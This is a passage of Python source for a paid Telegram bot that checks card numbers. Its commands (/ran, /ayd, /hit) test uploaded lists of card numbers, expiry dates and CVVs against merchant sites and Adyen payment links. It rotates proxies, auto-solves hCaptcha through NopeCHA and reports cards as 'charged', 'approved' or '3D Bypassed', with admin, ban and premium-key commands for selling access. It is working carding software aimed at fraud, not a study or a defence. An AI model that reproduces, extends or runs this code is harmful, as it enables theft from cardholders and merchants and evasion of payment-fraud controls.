            f"{pe(E['rocket'])} {bold('Random File Check')}\n\n"
            f"{pe(E['bolt'])} {bold('Response:')} {bold(_last_response[:60])}\n"
            f"{pe(R['cc'])} <tg-spoiler>{_last_cc}</tg-spoiler>\n\n"
            f"{pe(E['bolt'])} {bold('Progress:')} {bold(str(checked + skipped))}/{bold(str(total))}\n"
            f"{pe(E['gem'])} {bold('Charged:')} {bold(str(charged))}\n"
            f"{pe(E['check'])} {bold('Approved:')} {bold(str(approved))}\n"
            f"{pe(E['cross'])} {bold('Declined:')} {bold(str(declined))}\n"
            f"{pe(E['hourglass'])} {bold('Remaining:')} {bold(str(max(0, total - checked - skipped)))}\n\n"
            f"{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}"
        )
        try:
            if checked + skipped >= total:
                await safe_edit(status_msg, progress_text)
            else:
                await safe_edit(status_msg, progress_text, reply_markup=stop_btn)
        except Exception:
            pass

    async def worker():
        nonlocal checked, approved, charged, declined, skipped, _last_response, _last_cc
        while not _RAN_STOP_FLAGS.get(stop_key):
            try:
                cc = cc_queue.get_nowait()
            except asyncio.QueueEmpty:
                break

            site = random.choice(sites_list)
            result = await _ran_check_one(cc, site, proxy_list, sites_list, user_id)

            if _RAN_STOP_FLAGS.get(stop_key):
                async with _state_lock:
                    skipped += 1
                cc_queue.task_done()
                continue

            raw_response = result.get("Response") or "Unknown"
            response = raw_response.lower()
            is_charged = _is_charged_response(raw_response, result)
            is_approved = any(ind in response for ind in _APPROVED_INDICATORS)
            should_send_hit = False

            async with _state_lock:
                checked += 1
                _last_response = raw_response
                _last_cc = cc
                if is_charged:
                    charged += 1
                    approved += 1
                    should_send_hit = True
                elif is_approved:
                    approved += 1
                    should_send_hit = True
                else:
                    declined += 1

            if should_send_hit:
                asyncio.create_task(_deliver_ran_hit(
                    cc, result, raw_response, is_charged,
                    user_id, user_name, user_uname, chat_id,
                ))

            await _maybe_update_status()
            cc_queue.task_done()

    try:
        worker_count = min(RAN_PER_USER, total)
        await asyncio.gather(
            *[asyncio.create_task(worker()) for _ in range(worker_count)],
            return_exceptions=True,
        )
        await _maybe_update_status(force=True)
    finally:
        _RAN_STOP_FLAGS.pop(stop_key, None)
        release_ran_user_semaphore(user_id)

    # Final summary
    _elapsed = int(time.time() - _start_time)
    _elapsed_str = f"{_elapsed // 60}m {_elapsed % 60}s" if _elapsed >= 60 else f"{_elapsed}s"
    try:
        await safe_edit(status_msg, 
            f"{pe(E['check'])} {bold('Random File Check Complete!')}\n\n"
            f"{pe(E['bolt'])} {bold('Total:')} {bold(str(total))}\n"
            f"{pe(E['gem'])} {bold('Charged:')} {bold(str(charged))}\n"
            f"{pe(E['check'])} {bold('Approved:')} {bold(str(approved))}\n"
            f"{pe(E['cross'])} {bold('Declined:')} {bold(str(declined))}\n"
            f"{pe(E['warn'])} {bold('Skipped:')} {bold(str(skipped))}\n"
            f"{pe(E['hourglass'])} {bold('Time:')} {bold(_elapsed_str)}\n\n"
            f"{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}"
        )
    except Exception:
        pass


@router.callback_query(F.data.startswith("ran_stop:"))
async def cb_ran_stop(callback: types.CallbackQuery):
    stop_key = callback.data.split(":", 1)[1]
    clicker_id = callback.from_user.id

    try:
        owner_id = int(stop_key.split(":")[-1])
    except (ValueError, IndexError):
        owner_id = 0

    if clicker_id != owner_id and not auth.is_admin(clicker_id):
        await callback.answer(bold("Madarcod apny kaam kr !"), show_alert=True)
        return

    _RAN_STOP_FLAGS[stop_key] = True
    await callback.answer(bold("Stopping..."), show_alert=False)
    try:
        await callback.message.edit_reply_markup(reply_markup=None)
    except Exception:
        pass


@router.message(Command("ran"))
async def cmd_ran(message: types.Message):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return

    user_id = message.from_user.id

    if auth.is_banned(user_id):
        return

    if not auth.has_premium_access(user_id, message.chat.id):
        await message.reply(
            f"{pe(E['cross'])} {bold('Premium Access Required!')}"
            f"\n\n{pe(E['bolt'])} {bold('Contact admin or redeem a key: @Mod_By_Kamal')}"
            f"\n{pe(E['next'])} /redeem {bold('Kamal-xxxxx')}"
        )
        return

    # ── Must reply to a .txt file ─────────────────────────────────────────────
    if not message.reply_to_message or not message.reply_to_message.document:
        await message.reply(
            f"{pe(E['warn'])} {bold('Usage:')}\n\n"
            f"{pe(E['next'])} {bold('Send a .txt file with CCs')}\n"
            f"{pe(E['next'])} {bold('Reply to the file with')} /ran\n\n"
            f"{pe(E['bolt'])} {bold('Format:')} cc|mm|yy|cvv {bold('(one per line)')}"
        )
        return

    doc = message.reply_to_message.document
    if not doc.file_name or not doc.file_name.lower().endswith(".txt"):
        await message.reply(
            f"{pe(E['cross'])} {bold('Only .txt files are supported!')}"
        )
        return

    # ── Filename ban-check ────────────────────────────────────────────────────
    if await guard_gen_filename(message, user_id):
        return

    # ── Check proxy ───────────────────────────────────────────────────────────
    proxy_data = get_user_proxy(user_id)
    if not proxy_data:
        await message.reply(
            f"{pe(E['cross'])} {bold('No Proxy Set!')}\n\n"
            f"{pe(E['warn'])} {bold('Add proxies first with')} /proxy"
        )
        return

    # ── Download file ─────────────────────────────────────────────────────────
    try:
        from io import BytesIO
        buf = BytesIO()
        await bot.download(doc.file_id, destination=buf)
        buf.seek(0)
        file_text = buf.read().decode("utf-8", errors="ignore")
    except Exception:
        await message.reply(
            f"{pe(E['cross'])} {bold('Failed to download file!')}"
        )
        return

    # ── Extract CCs ───────────────────────────────────────────────────────────
    # Run in executor: regex on a large file is CPU-bound and blocks the event loop
    from helpers import CC_PATTERN

    def _parse_ccs(text: str) -> list[str]:
        seen: set[str] = set()
        result: list[str] = []
        for m in CC_PATTERN.finditer(text):
            cc = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
            if cc not in seen:      # O(1) set lookup — was O(n) list scan = freeze on large files
                seen.add(cc)
                result.append(cc)
        if not result:
            for line in text.strip().splitlines():
                line = line.strip()
                parts = re.split(r'[|/]', line)
                if len(parts) >= 4:
                    cc = "|".join(p.strip() for p in parts[:4])
                    if cc not in seen:
                        seen.add(cc)
                        result.append(cc)
        return result

    all_ccs = await asyncio.get_running_loop().run_in_executor(
        CHECKER_POOL, _parse_ccs, file_text
    )

    if not all_ccs:
        await message.reply(
            f"{pe(E['cross'])} {bold('No valid CCs found in the file!')}"
        )
        return

    user_name = message.from_user.full_name or ""
    user_uname = message.from_user.username or ""

    # ── Apply CC limit ────────────────────────────────────────────────────────
    cc_limit = auth.get_cc_limit(user_id)
    if len(all_ccs) > cc_limit:
        all_ccs = all_ccs[:cc_limit]
        await message.reply(
            f"{pe(E['warn'])} {bold('CC limit reached!')} {bold(str(cc_limit))} {bold('CCs max for your plan.')}\n"
            f"{pe(E['next'])} {bold('Extra CCs skipped.')}"
        )

    # ── Gen-checker detection (ban + abort if triggered) ─────────────────────
    if not await guard_gen_cards(all_ccs, message, user_id):
        return

    total = len(all_ccs)

    # ── Block duplicate runs ──────────────────────────────────────────────────
    if user_id in _RAN_ACTIVE_USERS:
        await message.reply(
            f"{pe(E['warn'])} {bold('MF! Your file check already in progress!')}\n\n"
            f"{pe(E['next'])} {bold('Wait for it to complete or tap')} {bold('Stop Checking')} {bold('first.')}"
        )
        return

    stop_key = f"{message.chat.id}:{user_id}"
    _RAN_STOP_FLAGS[stop_key] = False
    _RAN_ACTIVE_USERS.add(user_id)

    try:
        stop_btn = {
            "inline_keyboard": [[{
                "text": f"{bold('Stop Checking')}",
                "callback_data": f"ran_stop:{stop_key}",
                "icon_custom_emoji_id": E["stop"],
                "style": "danger",
            }]]
        }

        status_msg = await message.reply(
            f"{pe(E['rocket'])} {bold('Random File Check Started!')}\n\n"
            f"{pe(E['bolt'])} {bold('Total CCs:')} {bold(str(total))}\n"
            f"{pe(E['hourglass'])} {bold('Threads:')} {bold(str(RAN_PER_USER))} {bold('per user')} │ {bold(str(_RAN_GLOBAL_LIMIT))} {bold('global')}\n"
            f"{pe(E['refresh'])} {bold('Random proxy + site per CC')}\n"
            f"{pe(E['star'])} {bold('Auto-retry on dead sites')}\n\n"
            f"{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}",
            reply_markup=stop_btn,
        )

        await _process_ran_cards(all_ccs, user_id, user_name, user_uname, message.chat.id, status_msg, stop_key)
    finally:
        _RAN_ACTIVE_USERS.discard(user_id)


# ══════════════════════════════════════════════════════════════════════════════
#  /admin COMMAND — Owner adds/removes admins
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("admin"))
async def cmd_admin(message: types.Message):
    if not auth.is_owner(message.from_user.id):
        await message.reply(f"{pe(E['cross'])} {bold('Owner only command!')}")
        return

    args = message.text.split(maxsplit=1)
    if len(args) < 2 or not args[1].strip().isdigit():
        await message.reply(
            f"{pe(E['warn'])} {bold('Usage:')} /admin {bold('user-id')}"
        )
        return

    target_id = int(args[1].strip())
    if auth.add_admin(target_id):
        await message.reply(
            f"{pe(E['check'])} {bold('Admin Added!')}\n\n"
            f"{pe(E['user'])} {bold('ID:')} {bold(str(target_id))}"
        )
        try:
            await bot.send_message(
                target_id,
                f"{pe(E['gem'])} {bold('You have been promoted to Admin!')}\n\n"
                f"{pe(E['bolt'])} {bold('You now have full admin access.')}"
            )
        except Exception:
            pass
    else:
        await message.reply(f"{pe(E['warn'])} {bold('User is already an admin.')}")


# ══════════════════════════════════════════════════════════════════════════════
#  /unadmin COMMAND — Owner removes admin
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("unadmin"))
async def cmd_unadmin(message: types.Message):
    if not auth.is_owner(message.from_user.id):
        await message.reply(f"{pe(E['cross'])} {bold('Owner only command!')}")
        return

    args = message.text.split(maxsplit=1)
    if len(args) < 2 or not args[1].strip().isdigit():
        await message.reply(
            f"{pe(E['warn'])} {bold('Usage:')} /unadmin {bold('user-id')}"
        )
        return

    target_id = int(args[1].strip())
    if auth.remove_admin(target_id):
        await message.reply(
            f"{pe(E['check'])} {bold('Admin Removed!')}\n\n"
            f"{pe(E['user'])} {bold('ID:')} {bold(str(target_id))}"
        )
    else:
        await message.reply(f"{pe(E['warn'])} {bold('User is not an admin.')}")


# ══════════════════════════════════════════════════════════════════════════════
#  /auth COMMAND — Admin gives premium access
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("auth"))
async def cmd_auth(message: types.Message):
    if not auth.is_admin(message.from_user.id):
        await message.reply(f"{pe(E['cross'])} {bold('Admin only command!')}")
        return

    args = message.text.split()
    if len(args) < 2 or not args[1].strip().isdigit():
        await message.reply(
            f"{pe(E['warn'])} {bold('Usage:')} /auth {bold('user-id')} {bold('[days]')}\n"
            f"{pe(E['next'])} {bold('Days is optional (0 = lifetime)')}"
        )
        return

    target_id = int(args[1].strip())
    days = int(args[2]) if len(args) >= 3 and args[2].isdigit() else 0

    auth.auth_user(target_id, days=days, by=message.from_user.id)
    expiry_text = "Lifetime" if days == 0 else f"{days} days"

    await message.reply(
        f"{pe(E['check'])} {bold('Premium Granted!')}\n\n"
        f"{pe(E['user'])} {bold('ID:')} {bold(str(target_id))}\n"
        f"{pe(E['gem'])} {bold('Plan:')} {bold(expiry_text)}"
    )

    # Notify user
    try:
        await bot.send_message(
            target_id,
            f"{pe(E['gem'])} {bold('Premium Access Activated!')} {pe(E['gem'])}\n\n"
            f"{pe(E['check'])} {bold('Thanks for your purchase!')}\n"
            f"{pe(E['bolt'])} {bold('Plan:')} {bold(expiry_text)}\n\n"
            f"{pe(E['rocket'])} {bold('You now have access to:')}\n"
            f"{pe(E['next'])} /sh — {bold('Check CC')}\n"
            f"{pe(E['next'])} /msh — {bold('Mass Check')}\n"
            f"{pe(E['next'])} /ran — {bold('File Check')}\n\n"
            f"{pe(E['sparkle'])} {bold('Enjoy your premium experience!')}"
        )
    except Exception:
        pass


# ══════════════════════════════════════════════════════════════════════════════
#  /unauth COMMAND — Admin removes premium
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("unauth"))
async def cmd_unauth(message: types.Message):
    if not auth.is_admin(message.from_user.id):
        await message.reply(f"{pe(E['cross'])} {bold('Admin only command!')}")
        return

    args = message.text.split(maxsplit=1)
    if len(args) < 2 or not args[1].strip().isdigit():
        await message.reply(
            f"{pe(E['warn'])} {bold('Usage:')} /unauth {bold('user-id')}"
        )
        return

    target_id = int(args[1].strip())
    if auth.unauth_user(target_id):
        await message.reply(
            f"{pe(E['check'])} {bold('Premium Removed!')}\n\n"
            f"{pe(E['user'])} {bold('ID:')} {bold(str(target_id))}"
        )
    else:
        await message.reply(f"{pe(E['warn'])} {bold('User has no premium access.')}")


# ══════════════════════════════════════════════════════════════════════════════
#  /ban COMMAND — Admin bans user
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("ban"))
async def cmd_ban(message: types.Message):
    if not auth.is_admin(message.from_user.id):
        await message.reply(f"{pe(E['cross'])} {bold('Admin only command!')}")
        return

    args = message.text.split(maxsplit=1)
    if len(args) < 2 or not args[1].strip().isdigit():
        await message.reply(
            f"{pe(E['warn'])} {bold('Usage:')} /ban {bold('user-id')}"
        )
        return

    target_id = int(args[1].strip())
    if auth.ban_user(target_id):
        await message.reply(
            f"{pe(E['check'])} {bold('User Banned!')}\n\n"
            f"{pe(E['user'])} {bold('ID:')} {bold(str(target_id))}"
        )
    else:
        await message.reply(f"{pe(E['warn'])} {bold('User is already banned.')}")


# ══════════════════════════════════════════════════════════════════════════════
#  /unban COMMAND — Admin unbans user
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("unban"))
async def cmd_unban(message: types.Message):
    if not auth.is_admin(message.from_user.id):
        await message.reply(f"{pe(E['cross'])} {bold('Admin only command!')}")
        return

    args = message.text.split(maxsplit=1)
    if len(args) < 2 or not args[1].strip().isdigit():
        await message.reply(
            f"{pe(E['warn'])} {bold('Usage:')} /unban {bold('user-id')}"
        )
        return

    target_id = int(args[1].strip())
    if target_id not in _banned_users:
        await message.reply(f"{pe(E['warn'])} {bold('User is not banned.')}")
        return

    unban_user(target_id)
    await message.reply(
        f"{pe(E['check'])} {bold('User Unbanned!')}\n\n"
        f"{pe(E['user'])} {bold('ID:')} {bold(str(target_id))}"
    )


# ══════════════════════════════════════════════════════════════════════════════
#  /key COMMAND — Admin generates premium keys
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("key"))
async def cmd_key(message: types.Message):
    if not auth.is_admin(message.from_user.id):
        await message.reply(f"{pe(E['cross'])} {bold('Admin only command!')}")
        return

    args = message.text.split()
    if len(args) < 3 or not args[1].isdigit() or not args[2].isdigit():
        await message.reply(
            f"{pe(E['warn'])} {bold('Usage:')} /key {bold('users')} {bold('days')}\n\n"
            f"{pe(E['next'])} {bold('Example:')} /key 10 1\n"
            f"{pe(E['next'])} {bold('Generates 1 key — 10 users can redeem, 1 day each')}"
        )
        return

    max_users = int(args[1])
    days = int(args[2])

    if max_users < 1 or max_users > 1000:
        await message.reply(f"{pe(E['cross'])} {bold('Users must be 1-1000')}")
        return

    keys = auth.generate_keys(max_users, days, created_by=message.from_user.id)
    key = keys[0]

    text = (
        f"{pe(E['gem'])} {bold('𝙆𝙚𝙮 𝙂𝙚𝙣𝙚𝙧𝙖𝙩𝙚𝙙')} {pe(E['check'])}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"┣ {pe(E['bolt'])} {bold('𝗞𝗲𝘆')} ➜ <code>{key}</code>\n"
        f"┣ {pe(E['user'])} {bold('𝗦𝗹𝗼𝘁𝘀')} ➜ {bold(str(max_users))} {bold('users can redeem')}\n"
        f"┣ {pe(E['star'])} {bold('𝗣𝗹𝗮𝗻')} ➜ {bold(str(days))} {bold('days each')}\n\n"
        f"{pe(E['sparkle'])} {bold('𝗨𝘀𝗲𝗿𝘀 𝗿𝗲𝗱𝗲𝗲𝗺 𝘄𝗶𝘁𝗵')} /redeem {key} {pe(E['bolt'])}"
    )
    await message.reply(text)


# ══════════════════════════════════════════════════════════════════════════════
#  /redeem COMMAND — User redeems a premium key
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("redeem"))
async def cmd_redeem(message: types.Message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2 or not args[1].strip():
        await message.reply(
            f"{pe(E['warn'])} {bold('Usage:')} /redeem {bold('Kamal-xxxxx')}"
        )
        return

    if auth.is_premium(message.from_user.id):
        expiry = auth.get_premium_expiry(message.from_user.id)
        await message.reply(
            f"{pe(E['cross'])} {bold('You already have premium!')}\n\n"
            f"{pe(E['bolt'])} {bold('Plan:')} {bold(expiry)}\n"
            f"{pe(E['warn'])} {bold('You cannot redeem another key while premium is active.')}"
        )
        return

    key = args[1].strip()
    success, info = auth.redeem_key(message.from_user.id, key)

    if success:
        await message.reply(
            f"{pe(E['gem'])} {bold('Key Redeemed Successfully!')} {pe(E['gem'])}\n\n"
            f"{pe(E['check'])} {bold('Thanks for your purchase!')}\n"
            f"{pe(E['bolt'])} {bold('Plan:')} {bold(info)}\n\n"
            f"{pe(E['rocket'])} {bold('You now have access to:')}\n"
            f"{pe(E['next'])} /sh — {bold('Check CC')}\n"
            f"{pe(E['next'])} /msh — {bold('Mass Check')}\n"
            f"{pe(E['next'])} /ran — {bold('File Check')}\n\n"
            f"{pe(E['sparkle'])} {bold('Enjoy your premium experience!')}"
        )
    else:
        await message.reply(
            f"{pe(E['cross'])} {bold('Redemption Failed!')}\n\n"
            f"{pe(E['warn'])} {bold(info)}"
        )


# ══════════════════════════════════════════════════════════════════════════════
#  /nopecha COMMAND — Set / view / clear NopeCHA API key (per-user, optional)
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("nopecha"))
async def cmd_nopecha(message: types.Message):
    """
    /nopecha              — show current key status
    /nopecha <key>        — validate & save key
    /nopecha set <key>    — validate & save key (alias)
    /nopecha clear        — remove saved key
    """
    user_id = message.from_user.id

    if auth.is_banned(user_id):
        return

    args_text = (message.text or "").split(maxsplit=1)
    arg = args_text[1].strip() if len(args_text) >= 2 else ""

    # ── CLEAR ──
    if arg.lower() == "clear":
        auth.set_nopecha_key(user_id, "")
        await message.reply(
            f"{pe(E['check'])} {bold('NopeCHA key cleared.')}\n\n"
            f"{pe(E['warn'])} {bold('Captcha auto-solve is now disabled.')}\n"
            f"{pe(E['next'])} {bold('Use')} /nopecha {bold('<api_key>')} {bold('to add one.')}"
        )
        return

    # ── SHOW STATUS ──
    if not arg or arg.lower() == "status":
        existing = auth.get_nopecha_key(user_id)
        if not existing:
            await message.reply(
                f"{pe(E['warn2'])} {bold('No NopeCHA API key set.')}\n\n"
                f"{pe(E['next'])} {bold('To enable auto captcha solving:')}\n"
                f"{pe(E['bolt'])} /nopecha {bold('<your_api_key>')}\n\n"
                f"{pe(E['link'])} {bold('Get your key at:')} nopecha.com"
            )
        else:
            masked = existing[:6] + "..." + existing[-4:] if len(existing) > 10 else "****"
            await message.reply(
                f"{pe(E['check'])} {bold('NopeCHA key is set.')}\n\n"
                f"{pe(E['bolt'])} {bold('Key:')} {bold(masked)}\n"
                f"{pe(E['sparkle'])} {bold('hCaptcha will be auto-solved when triggered.')}\n\n"
                f"{pe(E['next'])} {bold('To remove:')} /nopecha clear"
            )
        return

    # ── SET KEY (strip optional "set " prefix) ──
    key = arg[4:].strip() if arg.lower().startswith("set ") else arg

    if not key:
        await message.reply(
            f"{pe(E['warn'])} {bold('Usage:')} /nopecha {bold('<api_key>')}"
        )
        return

    # Validate key against NopeCHA status endpoint
    validating_msg = await message.reply(
        f"{pe(E['loading'])} {bold('Validating NopeCHA key...')}"
    )
    try:
        async with httpx.AsyncClient(timeout=10) as client:
            resp = await client.get(
                "https://api.nopecha.com/v1/status",
                headers={"Authorization": f"Basic {key}"},
            )
        if resp.status_code == 401:
            await safe_edit(validating_msg, 
                f"{pe(E['cross'])} {bold('Invalid API key.')}\n\n"
                f"{pe(E['warn'])} {bold('NopeCHA rejected this key. Please check and try again.')}"
            )
            return
        if resp.status_code == 403:
            await safe_edit(validating_msg, 
                f"{pe(E['cross'])} {bold('Access denied.')}\n\n"
                f"{pe(E['warn'])} {bold('NopeCHA returned 403. IP may be banned or key suspended.')}"
            )
            return
        resp.raise_for_status()
        data    = resp.json()
        status  = (data.get("status") or "").strip()
        plan    = data.get("plan") or "Unknown"
        credit  = data.get("credit") or data.get("credits") or 0
    except httpx.HTTPStatusError as e:
        await safe_edit(validating_msg, 
            f"{pe(E['cross'])} {bold('Validation failed.')}\n\n"
            f"{pe(E['warn'])} {bold(f'HTTP {e.response.status_code}')}"
        )
        return
    except Exception as e:
        await safe_edit(validating_msg, 
            f"{pe(E['cross'])} {bold('Could not reach NopeCHA.')}\n\n"
            f"{pe(E['warn'])} {bold(str(e)[:80])}"
        )
        return

    if status.lower() not in ("active", "ok", "valid", ""):
        await safe_edit(validating_msg, 
            f"{pe(E['cross2'])} {bold('Key not active.')}\n\n"
            f"{pe(E['warn'])} {bold('Status:')} {bold(status)}\n"
            f"{pe(E['next'])} {bold('Please renew your NopeCHA plan.')}"
        )
        return

    # Key is valid — save it
    auth.set_nopecha_key(user_id, key)
    masked = key[:6] + "..." + key[-4:] if len(key) > 10 else "****"
    await safe_edit(validating_msg, 
        f"{pe(E['gem'])} {bold('NopeCHA Key Saved!')} {pe(E['gem'])}\n\n"
        f"{pe(E['check'])} {bold('Key:')} {bold(masked)}\n"
        f"{pe(E['bolt'])} {bold('Plan:')} {bold(str(plan))}\n"
        f"{pe(E['bank'])} {bold('Credits:')} {bold(str(credit))}\n\n"
        f"{pe(E['sparkle'])} {bold('hCaptcha will now be auto-solved during /hit checks.')}\n"
        f"{pe(E['next'])} {bold('To remove:')} /nopecha clear"
    )


# ══════════════════════════════════════════════════════════════════════════════
#  /ayd COMMAND — Adyen payment link checker (max 10 CCs)
# ══════════════════════════════════════════════════════════════════════════════

AYD_MAX_CCS = 10
_AYD_EDIT_LOCKS: dict[int, asyncio.Lock] = {}
_AYD_STOP_FLAGS: dict[str, bool] = {}
_AYD_ACTIVE_USERS: set[int] = set()

PROXY_MAX_RETRIES = 3


def _ayd_status_line(result: dict) -> str:
    """Map Adyen result to a styled status line."""
    err = result.get("error") or ""
    status = (result.get("payment_status") or "").lower()
    err_lower = err.lower()

    if status == "authorised" or status == "received":
        return f"{pe(E['gem'])} {bold('Charged / Success!')}"
    if "insufficient" in status or "insufficient" in err_lower:
        return f"{pe(E['check2'])} {bold('Insufficient Funds')}"
    if "cvc" in status or "cvc" in err_lower:
        return f"{pe(E['check3'])} {bold('Incorrect CVC — Live')}"
    if status == "refused" or "declined" in status or "declined" in err_lower:
        return f"{pe(E['cross'])} {bold('Declined')}"
    if "expired" in err_lower or "not active" in err_lower:
        return f"{pe(E['cross2'])} {bold('Checkout Expired')}"
    if "3ds" in err_lower or "challenge" in err_lower:
        return f"{pe(E['check'])} {bold('3DS Challenge')}"
    if err:
        return f"{pe(E['warn2'])} {bold(err[:60])}"
    if status:
        return f"{pe(E['warn2'])} {bold(status[:60])}"
    return f"{pe(E['warn2'])} {bold('Unknown')}"


def _ayd_raw_response(result: dict) -> str:
    """Extract the original Adyen response string."""
    return result.get("payment_status") or result.get("error") or "Unknown"


def _ayd_cc_block(cc: str, result: dict) -> str:
    sl = _ayd_status_line(result)
    raw = _ayd_raw_response(result)
    tds_line = f"\n{pe(E['bolt'])} {bold('3D Bypassed')}" if result.get("3d_bypassed") else ""
    return (
        f"{sl}\n"
        f"{pe(R['cc'])} {bold('CC:')} <tg-spoiler>{cc}</tg-spoiler>\n"
        f"{pe(R['gate'])} {bold('Response:')} {bold(raw)}"
        f"{tds_line}"
    )


def _is_checkout_expired(result: dict) -> bool:
    err = (result.get("error") or "").lower()
    return "not active" in err or "expired" in err


def _is_success(result: dict) -> bool:
    status = (result.get("payment_status") or "").lower()
    return status in ("authorised", "received")


async def _ayd_check_single(
    cc_str: str, link: str, user_id: int,
    status_msg: types.Message, results: dict, order: list,
    user_name: str, user_uname: str, stop_key: str,
    checkout_info: dict,
):
    if _AYD_STOP_FLAGS.get(stop_key):
        results[cc_str] = {"error": "Stopped", "cc": cc_str}
        return

    proxies = get_user_proxies(user_id)
    last_result = None

    for attempt in range(PROXY_MAX_RETRIES):
        if _AYD_STOP_FLAGS.get(stop_key):
            results[cc_str] = {"error": "Stopped", "cc": cc_str}
            return

        proxy_data = random.choice(proxies) if proxies else None
        try:
            last_result = await ayden_process_payment(link, cc_str, proxy_data)
            if last_result.get("error") and "proxy" in last_result["error"].lower():
                continue
            break
        except Exception as e:
            last_result = {"error": str(e)[:80], "cc": cc_str}
            continue

    results[cc_str] = last_result or {"error": "All proxy retries failed", "cc": cc_str}

    if _is_checkout_expired(results[cc_str]):
        _AYD_STOP_FLAGS[stop_key] = True

    # ── Update the shared message ──
    msg_id = status_msg.message_id
    if msg_id not in _AYD_EDIT_LOCKS:
        _AYD_EDIT_LOCKS[msg_id] = asyncio.Lock()

    async with _AYD_EDIT_LOCKS[msg_id]:
        done_count = sum(1 for cc in order if cc in results)
        total = len(order)

        header = (
            f"{pe(E['gem'])} {bold('Adyen Hitter')} [{bold(str(done_count))}/{bold(str(total))}]\n\n"
            f"{pe(E['bolt'])} {bold('Merchant:')} {bold(checkout_info.get('merchant', '-'))}\n"
            f"{pe(E['star'])} {bold('Product:')} {bold(checkout_info.get('product', '-'))}\n"
            f"{pe(E['bank'])} {bold('Amount:')} {bold(checkout_info.get('amount_str', '-'))}\n"
            f"{pe(E['link'])} {bold('Link:')} {bold(checkout_info.get('link_short', '-'))}\n"
            f"{pe(E['globe'])} {bold('URL:')} {bold(checkout_info.get('return_url', '-'))}\n"
        )

        lines = [header]
        for cc in order:
            if cc in results:
                lines.append(_ayd_cc_block(cc, results[cc]))
            else:
                lines.append(
                    f"{pe(E['loading'])} <tg-spoiler>{cc}</tg-spoiler> {bold('checking...')}"
                )

        if _AYD_STOP_FLAGS.get(stop_key) and _is_checkout_expired(results.get(cc_str, {})):
            lines.append(f"\n{pe(E['cross2'])} {bold('Checkout expired — stopped.')}")

        lines.append(f"\n{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}")

        try:
            await safe_edit(status_msg, "\n\n".join(lines))
        except Exception:
            pass

    if sum(1 for cc in order if cc in results) == len(order):
        _AYD_EDIT_LOCKS.pop(msg_id, None)


@router.message(Command("ayd"))
async def cmd_ayd(message: types.Message):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return

    user_id = message.from_user.id

    if auth.is_banned(user_id):
        return

    if not auth.has_premium_access(user_id, message.chat.id):
        await message.reply(
            f"{pe(E['cross'])} {bold('Premium Access Required!')}"
            f"\n\n{pe(E['bolt'])} {bold('Contact admin or redeem a key: @Mod_By_Kamal')}"
            f"\n{pe(E['next'])} /redeem {bold('Kamal-xxxxx')}"
        )
        return

    if user_id in _AYD_ACTIVE_USERS:
        await message.reply(
            f"{pe(E['warn'])} {bold('Your Adyen check is already in progress!')}\n\n"
            f"{pe(E['next'])} {bold('Wait for it to complete or tap')} {bold('Stop')} {bold('first.')}"
        )
        return

    # ── Extract link + CCs ──
    raw_text = ""
    args = message.text.split(maxsplit=1)
    if len(args) >= 2:
        raw_text = args[1]

    if message.reply_to_message:
        reply_text = message.reply_to_message.text or message.reply_to_message.caption or ""
        raw_text = raw_text + "\n" + reply_text if raw_text else reply_text

    if not raw_text.strip():
        await message.reply(
            f"{pe(E['warn'])} {bold('Usage:')}\n\n"
            f"{pe(E['next'])} /ayd https://eu.adyen.link/...\n"
            f"cc|mm|yy|cvv\n"
            f"cc|mm|yy|cvv\n\n"
            f"{pe(E['bolt'])} {bold('Max')} {bold(str(AYD_MAX_CCS))} {bold('CCs per check.')}"
        )
        return

    # ── Find Adyen link ──
    link_match = re.search(r'https?://[^\s]+adyen[^\s]+', raw_text, re.IGNORECASE)
    if not link_match:
        await message.reply(
            f"{pe(E['cross'])} {bold('No Adyen link found!')}\n\n"
            f"{pe(E['next'])} {bold('Paste a valid Adyen checkout link.')}"
        )
        return
    adyen_link = link_match.group(0)

    # ── Find CCs ──
    from helpers import CC_PATTERN
    all_ccs = _DedupeList()
    for m in CC_PATTERN.finditer(raw_text):
        cc = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
        if cc not in all_ccs:
            all_ccs.append(cc)

    if not all_ccs:
        for line in raw_text.strip().splitlines():
            line = line.strip()
            parts = re.split(r'[|/]', line)
            if len(parts) >= 4:
                num = parts[0].strip()
                if num.isdigit() and len(num) >= 13:
                    cc = "|".join(p.strip() for p in parts[:4])
                    if cc not in all_ccs:
                        all_ccs.append(cc)

    if not all_ccs:
        await message.reply(
            f"{pe(E['cross'])} {bold('No valid CCs found!')}\n\n"
            f"{pe(E['next'])} {bold('Format:')} cc|mm|yy|cvv"
        )
        return

    skipped = 0
    if len(all_ccs) > AYD_MAX_CCS:
        skipped = len(all_ccs) - AYD_MAX_CCS
        all_ccs = all_ccs[:AYD_MAX_CCS]

    # ── Check proxy ──
    proxies = get_user_proxies(user_id)
    if not proxies:
        await message.reply(
            f"{pe(E['cross'])} {bold('No Proxy Set!')}\n\n"
            f"{pe(E['warn'])} {bold('You must add a proxy before checking.')}\n"
            f"{pe(E['next'])} {bold('Use:')} /proxy host:port:user:pass"
        )
        return

    user_name = message.from_user.full_name or ""
    user_uname = message.from_user.username or ""
    total = len(all_ccs)
    chat_id = message.chat.id
    stop_key = f"ayd:{chat_id}:{user_id}"
    _AYD_STOP_FLAGS[stop_key] = False
    _AYD_ACTIVE_USERS.add(user_id)

    link_short = adyen_link.split("/")[-1][:20] + "..."

